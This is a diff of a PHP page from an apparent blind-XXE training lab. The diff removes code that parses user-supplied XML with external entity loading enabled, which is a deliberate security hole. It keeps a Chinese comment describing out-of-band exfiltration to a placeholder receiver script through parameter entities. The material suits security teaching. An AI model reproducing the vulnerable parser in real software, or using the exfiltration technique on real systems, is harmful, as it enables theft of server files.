@@ -4,20 +4,12 @@
         <title>XXE(无回显)</title>
     </head>
     <body>
-        <?php
-            $xmlStr = $_GET['xml'];
-            libxml_use_internal_errors(true);
-            $xml = simplexml_load_string($xmlStr,"SimpleXMLElement",LIBXML_NOENT|LIBXML_DTDLOAD);
-            if ($xml === false) {
-                echo "Failed loading XML\n";
-                foreach(libxml_get_errors() as $error) {
-                    echo "\t", $error->message;
-                }
-                echo '<br />';
-            }
-            echo "<p>没有回显怎么办 (:(:(:</p>"
-
-            /*
+        <form action='./nofeedback.php' method='GET'>
+            输入你的xml文件内容
+            <textarea name='xml'></textarea>
+            <input type="submit" value="submit" name="submit">
+        </form>
+        <!--
             绕过方法：
 
             在你的电脑里新建一个名为recv的php文件，即recv.php，假设这个php文件的url为http://xxx.xxx.xxx/recv.php，文件内容如下：
@@ -48,7 +40,6 @@
                 %dtd;
                 %send;
             ]>
-            */
-        ?>
+        -->
     </body>
 </html>
